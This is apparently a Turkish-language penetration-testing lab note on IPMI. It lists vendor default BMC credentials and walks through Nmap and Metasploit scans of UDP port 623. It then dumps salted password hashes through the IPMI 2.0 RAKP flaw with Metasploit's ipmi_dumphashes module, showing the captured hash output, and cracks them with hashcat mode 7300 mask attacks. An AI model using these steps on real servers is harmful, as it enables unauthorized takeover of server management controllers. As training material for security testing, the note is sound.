# IPMI

**Akıllı Platform Yönetim Arayüzü (IPMI)** sistem yönetimi ve izleme için kullanılan donanım tabanlı ana bilgisayar yönetim sistemleri için standartlaştırılmış bir dizi spesifikasyondur. Otonom bir alt sistem görevi görür ve ana bilgisayarın BIOS, CPU, ürün yazılımı ve altta yatan işletim sisteminden bağımsız olarak çalışır. IPMI, sysadminlere sistemleri yönetme ve izleme yeteneği sağlar, ancak tepkisiz bir durumda veya kapalı olsalar bile. Sistemin donanımına doğrudan bir ağ bağlantısı kullanarak çalışır ve bir giriş kabuğu üzerinden işletim sistemine erişim gerektirmez. IPMI, hedef konakçıya fiziksel erişim gerektirmeden sistemlere uzaktan yükseltmeler için de kullanılabilir. IPMI genellikle üç şekilde kullanılır:

- OS, BIOS ayarlarını değiştirmek için önyükleme yapmadan önce
- Ev sahibi tamamen aşağı çekildiğinde
- Sistem arızasından sonra bir ana bilgisayara erişim

+ **PORT** `623 UDP `
+ **IPMI protokolünü kullanan sistemlere Baseboard Management Controllers**

## ENUMERATION

### NMAP

```bash
sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local

PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version:
|   Version:
|     IPMI-2.0
|   UserAuth:
|   PassAuth: auth_user, non_null_user
|_  Level: 2.0
```
**Burada, IPMI protokolünün gerçekten 623 numaralı bağlantı noktasında dinlediğini ve Nmap'ın protokolün 2.0'ının parmak izini kullandığını görebiliyoruz.**


### Metasploit Versiyon Taraması


```bash
msf6 > use auxiliary/scanner/ipmi/ipmi_version 
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS     10.129.42.195    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      623              yes       The target port (UDP)
   THREADS    10               yes       The number of concurrent threads


msf6 auxiliary(scanner/ipmi/ipmi_version) > run
run

[*] Sending IPMI requests to 10.129.42.195->10.129.42.195 (1 hosts)
[+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed


```



| Product | Username | Password |
| ----------- | ----------- | ----------- |
| Dell iDRAC | root | calvin |
| HP iLO | Administrator | randomized 8-character string consisting of numbers and uppercase letters |
| Supermicro IPMI | ADMIN | ADMIN |


## Dangerous Settings

Varsayılan kimlik bilgileri bir BMC'ye erişmek için çalışmazsa, IPMI 2.0'daki RAKP protokolündeki bir kusura dönebiliriz. Kimlik doğrulama işlemi sırasında sunucu, kimlik doğrulaması gerçekleşmeden önce kullanıcının şifresinin tuzlu bir SHA1 veya MD5 hashini istemciye gönderir. Bu, BMC'deki HERHANGİ bir geçerli kullanıcı hesabı için şifre hash'i almak için kullanılabilir. Bu şifre karmaları daha sonra kullanarak bir sözlük saldırısı kullanılarak çevrimdışı olarak kırılabilir Hashcatmod `7300`. . Bir fabrika varsayılan şifresi kullanan bir HP iLO durumunda, bu Hashcat maske saldırısı komutunu kullanabiliriz `hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u` Sekiz karakterlik bir şifre için üst kutu harflerin ve sayıların tüm kombinasyonlarını dener.

### Metasploit Damping Haseti

```bash

msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                 Current Setting                                                    Required  Description
   ----                 ---------------                                                    --------  -----------
   CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format
   PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS               10.129.42.195                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                623                                                                yes       The target port
   THREADS              1                                                                  yes       The number of concurrent threads (max one per host)
   USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line



msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
[+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

> Farklı kelime listeleri ile deney yapmak, elde edilen hash'den şifre almak için çok önemlidir.


**burada bulunan hashi kırmak için**


```bash
cat ipmi.txt

a01024d382000000b1e81cd2ee36ffbe79ed74c17e6842e5204b5e158e3e4daa9ca2dbc1f980454ea123456789abcdefa123456789abcdef140561646d696e:c9ac097475f8ee9444ddfb549b75c281001394dc


# hascat

hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u


```